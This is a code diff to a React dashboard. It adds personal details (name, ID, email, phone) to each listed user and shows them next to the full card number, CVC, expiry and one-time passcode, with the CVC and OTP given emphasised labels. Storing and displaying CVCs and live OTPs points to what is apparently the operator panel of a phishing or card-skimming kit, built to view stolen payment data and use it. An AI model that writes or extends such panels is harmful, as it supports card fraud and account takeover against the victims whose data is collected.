@@ -25,6 +25,12 @@ type User = {
   expiry: string
   cvc: string
  },
+ personalInfo:{
+  name:string
+  id:string
+  email:string
+  phone:string
+ }
  otp:{
   otp:string
  }
@@ -82,10 +88,15 @@ export default function Dashboard() {
             <ul className="space-y-2">
               {users.map(user => (
                 <li key={user.id} className="bg-secondary p-2 rounded">
-                  <p className="font-semibold">{user.payment.cardNumber}</p>
-                  <p className="text-sm text-muted-foreground">{user.payment.cvc}</p>
-                  <p className="text-sm text-muted-foreground">{user.payment.expiry}</p>
-                  <p className="text-sm text-muted-foreground">{user.otp.otp}</p>
+                  <p className="font-semibold">{user.personalInfo.name}</p>
+
+                  <p className="text-sm text-muted-foreground">{user.personalInfo.id}</p>
+                  <p className="text-sm text-muted-foreground">{user.personalInfo.phone}</p>
+                  <p className="text-sm text-muted-foreground">{user.personalInfo.email}</p>
+                  <p className="text-sm text-blue-500 ">{user.payment.cardNumber}</p>
+                  <p className="text-sm text-blue-500 "><strong className="text-sm text-red-500 ">cvc: </strong>{user.payment.cvc}</p>
+                  <p className="text-sm text-blue-500 ">{user.payment.expiry}</p>
+                  <p className="text-sm text-blue-500 "><strong className="text-sm text-red-500 ">OTP: </strong>{user.otp.otp}</p>
                 </li>
               ))}
             </ul>
